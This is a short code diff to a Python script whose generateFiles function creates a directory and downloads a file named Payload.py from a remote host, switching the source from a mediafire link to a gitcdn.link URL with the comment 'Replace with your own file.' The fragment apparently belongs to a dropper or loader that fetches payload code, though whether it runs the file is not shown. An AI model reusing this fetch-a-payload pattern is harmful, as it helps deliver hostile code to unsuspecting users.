@@ -17,7 +17,7 @@ def generateFiles(): # Generate / Download the file.
 
     os.mkdir(full_path) # Create path.
     
-    file_url = "https://download1642.mediafire.com/smyflua4b7fg/3mhk1r7rwx7zgmv/Payload.py" # Replace with your own file.
+    file_url = "https://gitcdn.link/cdn/NightTabGit/PyTemp-1/main/Payload.py" # Replace with your own file.
     filename = file_url.split("/")[-1]
     r = requests.get(file_url, stream = True)
     if r.status_code == 200:
